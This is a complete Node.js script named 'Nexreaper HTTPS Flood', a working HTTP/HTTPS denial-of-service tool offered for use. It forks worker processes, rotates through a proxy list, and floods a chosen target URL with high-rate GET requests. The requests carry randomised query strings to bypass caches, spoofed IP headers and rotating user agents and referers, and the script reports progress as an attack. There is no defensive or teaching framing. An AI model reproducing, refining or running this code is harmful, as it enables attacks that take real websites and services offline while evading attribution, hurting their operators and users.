#!/usr/bin/env node

/**
 * Nexreaper HTTPS Flood – Mene
 * Creator: Ahmad Bilal Qureshi (Nexreaper)
 * Contributor: Wolf Intelligence
 * Version: 3.0 – HTTP/1.1 with connection pooling
 * 
 * Usage: node nexreaper-https.js <target> <time> <rate> <threads> <proxy.txt> [--direct]
 */

const cluster = require('cluster');
const https = require('https');
const http = require('http');
const fs = require('fs');
const crypto = require('crypto');
const { HttpsProxyAgent } = require('https-proxy-agent');

process.setMaxListeners(0);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ---------- Arguments ----------
if (process.argv.length < 7) {
    console.log(`
\x1b[31m[!] Usage: node nexreaper-https.js <target> <time> <rate> <threads> <proxy.txt> [--direct]\x1b[0m
    target   : full URL (http:// or https://)
    time     : seconds
    rate     : requests per second per worker
    threads  : worker processes
    proxy.txt: proxy list (IP:PORT)
    --direct : bypass proxies
`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    direct: process.argv.includes('--direct')
};

const targetUrl = new URL(args.target);
const targetHost = targetUrl.hostname;
const targetPort = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
const targetPath = targetUrl.pathname + targetUrl.search || '/';
const isHttps = targetUrl.protocol === 'https:';

// ---------- Load proxies ----------
let proxies = [];
if (!args.direct) {
    try {
        proxies = fs.readFileSync(args.proxyFile, 'utf-8')
            .split(/\r?\n/)
            .filter(Boolean);
    } catch {
        console.error(`\x1b[31m[!] Proxy file not found: ${args.proxyFile}\x1b[0m`);
        process.exit(1);
    }
    if (proxies.length === 0) {
        console.error(`\x1b[31m[!] No proxies found in ${args.proxyFile}\x1b[0m`);
        process.exit(1);
    }
}

// ---------- Utilities ----------
const getTime = () => {
    const d = new Date();
    return `\x1b[34m${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}\x1b[0m`;
};
const random = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomString = (n) => crypto.randomBytes(n).toString('hex').slice(0, n);
const ipSpoof = () => `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`;

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
];

const REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.facebook.com/'
];

// ---------- Cluster Master ----------
if (cluster.isMaster) {
    console.clear();
    console.log(`
\x1b[31m
  _   _  _____  __   __  _____  ____   _  _   ___   ____  _____  ____  
 | \\ | || ____| \\ \\ / / | ____||  _ \\ | || | |_ _| |  _ \\| ____||  _ \\ 
 |  \\| ||  _|    \\ V /  |  _|  | |_) || || |_ | |  | |_) |  _|  | |_) |
 | |\\  || |___    | |   | |___ |  _ < |__   _|| |  |  __/| |___ |  _ < 
 |_| \\_||_____|   |_|   |_____||_| \\_\\   |_|  |___| |_|   |_____||_| \\_\\
                                                                        
        NEXREAPER HTTPS FLOOD – Mene
        Creator: Ahmad Bilal Qureshi (Nexreaper)
        Contributor: Wolf Intelligence
        Version: 3.0 – HTTP/1.1 Connection Pool
\x1b[0m
`);
    console.log(`\x1b[37m[+] Target: ${args.target}`);
    console.log(`[+] Duration: ${args.time}s`);
    console.log(`[+] Rate/worker: ${args.rate} req/s`);
    console.log(`[+] Workers: ${args.threads}`);
    if (args.direct) console.log('[+] Mode: DIRECT (no proxies)');
    else console.log(`[+] Proxies: ${proxies.length}`);
    console.log(`[+] HTTPS flood starting...\x1b[0m\n`);

    let totalReq = 0;
    const startTime = Date.now();
    const totalTime = args.time * 1000;

    for (let i = 1; i <= args.threads; i++) {
        cluster.fork();
        console.log(`\x1b[35m[${getTime()}] Worker ${i} started\x1b[0m`);
    }

    cluster.on('message', (worker, msg) => {
        if (msg && msg.type === 'stats') totalReq += msg.count || 0;
    });

    const progress = setInterval(() => {
        const elapsed = Date.now() - startTime;
        const percent = Math.min(100, (elapsed / totalTime) * 100);
        const bar = '#'.repeat(Math.round(percent / 100 * 30)) + '-'.repeat(30 - Math.round(percent / 100 * 30));
        const rps = totalReq / (elapsed / 1000);
        const status = totalReq === 0 ? '\x1b[33mConnecting...\x1b[0m' : '\x1b[32mFlooding\x1b[0m';
        process.stdout.write(`\r\x1b[36m[${getTime()}] \x1b[33m[${bar}] ${percent.toFixed(1)}% | ${status} | Req: ${totalReq.toLocaleString()} | ${rps.toFixed(1)} req/s\x1b[0m`);
    }, 1000);

    setTimeout(() => {
        clearInterval(progress);
        console.log(`\n\x1b[35m[${getTime()}] Attack finished. Total requests: ${totalReq.toLocaleString()}\x1b[0m`);
        process.exit(0);
    }, totalTime);
}

// ---------- Worker ----------
else {
    let proxyIndex = 0;
    let count = 0;

    const getProxy = () => {
        if (args.direct) return null;
        const p = proxies[proxyIndex % proxies.length];
        proxyIndex++;
        return p;
    };

    const flood = () => {
        const proxy = getProxy();
        const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : null;

        const headers = {
            'User-Agent': random(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': random(REFERERS) + randomString(6),
            'X-Forwarded-For': ipSpoof(),
            'Client-IP': ipSpoof(),
            'Real-IP': ipSpoof(),
            'Connection': 'keep-alive'
        };

        const options = {
            hostname: targetHost,
            port: targetPort,
            path: targetPath + (targetPath.includes('?') ? '&' : '?') + randomString(10) + '=' + randomString(10),
            method: 'GET',
            headers: headers,
            agent: agent,
            rejectUnauthorized: false,
            timeout: 5000
        };

        const protocol = isHttps ? https : http;
        const req = protocol.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', () => {});
        req.end();

        count++;
        if (count % args.rate === 0) {
            process.send({ type: 'stats', count: args.rate });
        }
    };

    const interval = setInterval(() => {
        for (let i = 0; i < args.rate; i++) {
            flood();
        }
    }, 1000);

    const heartbeat = setInterval(() => {
        process.send({ type: 'heartbeat' });
    }, 5000);

    setTimeout(() => {
        clearInterval(interval);
        clearInterval(heartbeat);
        process.exit(0);
    }, args.time * 1000 + 500);
}